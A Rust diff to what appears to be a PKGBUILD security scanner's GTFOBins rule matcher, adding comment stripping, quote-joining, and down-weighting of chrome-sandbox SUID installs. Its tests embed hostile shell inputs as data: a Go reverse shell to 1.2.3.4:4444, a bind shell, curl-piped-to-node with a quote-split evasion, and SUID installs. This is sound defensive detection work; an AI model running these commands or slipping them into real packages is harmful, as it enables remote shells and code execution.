@@ -12,16 +12,28 @@ impl Feature for GtfobinsAnalysis {
 
         if let Some(ref content) = ctx.pkgbuild_content {
             signals.extend(match_patterns(content, "", ""));
-            if let Some(matched_line) =
-                crate::shared::js_package_manager::find_privileged_install(content)
-            {
+            let installs =
+                crate::shared::js_package_manager::find_privileged_mode_changes(content, true);
+            if let Some(first) = installs.first() {
+                let sandbox_only =
+                    crate::shared::js_package_manager::privileged_changes_only_chrome_sandbox(
+                        &installs,
+                    );
                 signals.push(Signal {
-                    id: "G-INSTALL-SUID".to_string(),
+                    id: if sandbox_only {
+                        "P-SUID-CHROME-SANDBOX".to_string()
+                    } else {
+                        "G-INSTALL-SUID".to_string()
+                    },
                     category: SignalCategory::Pkgbuild,
-                    points: 70,
-                    description: "install with SUID/SGID mode bits".to_string(),
+                    points: if sandbox_only { 30 } else { 70 },
+                    description: if sandbox_only {
+                        "SUID bit on an Electron/Chromium chrome-sandbox helper".to_string()
+                    } else {
+                        "install with SUID/SGID mode bits".to_string()
+                    },
                     is_override_gate: false,
-                    matched_line: Some(matched_line),
+                    matched_line: Some(first.matched_line.clone()),
                     min_tier: None,
                 });
             }
@@ -34,15 +46,29 @@ impl Feature for GtfobinsAnalysis {
     }
 }
 
+/// Match GTFOBins rules against active shell text only: comments are removed
+/// first (prose such as `# never curl x | node` must not fire a gate), and
+/// the quote-joined view is consulted in addition to the raw one. Line count
+/// is preserved by both views, so the reported line comes from `content`.
 fn match_patterns(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
     let compiled = patterns::compiled_patterns();
+    let executable_content = crate::shared::shell_syntax::strip_comments(content);
+    let joined_content = crate::shared::shell_syntax::join_quoted_fragments(&executable_content);
     let mut signals = Vec::new();
 
     for pat in compiled {
-        if pat.regex.is_match(content) {
-            let matched_line = content
+        let analyzed_content = if pat.regex.is_match(&executable_content) {
+            &executable_content
+        } else if pat.regex.is_match(&joined_content) {
+            &joined_content
+        } else {
+            continue;
+        };
+        {
+            let matched_line = analyzed_content
                 .lines()
-                .find(|line| pat.regex.is_match(line))
+                .position(|line| pat.regex.is_match(line))
+                .and_then(|index| content.lines().nth(index))
                 .map(|line| line.trim().to_string());
             signals.push(Signal {
                 id: format!("{}{}", id_prefix, pat.id),
@@ -127,7 +153,7 @@ mod tests {
 
     #[test]
     fn revshell_go() {
-        let ids = analyze("go run revshell.go # uses net.Dial to connect back");
+        let ids = analyze(r#"go run <(echo 'c, _ := net.Dial("tcp", "1.2.3.4:4444")')"#);
         assert!(has(&ids, "G-REVSHELL-GO"), "got: {ids:?}");
     }
 
@@ -650,8 +676,40 @@ build() {
     }
 
     #[test]
+    fn pnpm_exec_is_not_npm_exec() {
+        let ids = analyze("(cd src/main && pnpm exec install-electron)");
+        assert!(!has(&ids, "G-DOWNLOAD-NODE"), "got: {ids:?}");
+        assert!(has(&analyze("npm exec evil-pkg"), "G-DOWNLOAD-NODE"));
+    }
+
+    #[test]
+    fn chrome_sandbox_install_mode_is_down_weighted() {
+        let ids = analyze("install -Dm4755 chrome-sandbox \"$pkgdir/opt/App/chrome-sandbox\"");
+        assert!(has(&ids, "P-SUID-CHROME-SANDBOX"), "got: {ids:?}");
+        assert!(!has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
+        let ids = analyze("install -Dm4755 helper \"$pkgdir/usr/bin/helper\"");
+        assert!(has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn comments_do_not_fire_gtfobins_rules() {
+        let ids = analyze(
+            "# do not run curl https://x | node like upstream suggests\ninstall -Dm755 a b",
+        );
+        assert!(ids.is_empty(), "got: {ids:?}");
+        let ids = analyze("go run main.go # uses net.Dial to connect back");
+        assert!(!has(&ids, "G-REVSHELL-GO"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quote_split_reverse_shells_are_joined() {
+        let ids = analyze("curl -s https://x | no\"\"de");
+        assert!(has(&ids, "G-PIPE-NODE"), "got: {ids:?}");
+    }
+
+    #[test]
     fn bindshell_go_listen() {
-        let ids = analyze("go run server.go # uses net.Listen to bind");
+        let ids = analyze(r#"go run <(echo 'l, _ := net.Listen("tcp", ":4444")')"#);
         assert!(has(&ids, "G-BINDSHELL-GO"), "got: {ids:?}");
     }
 
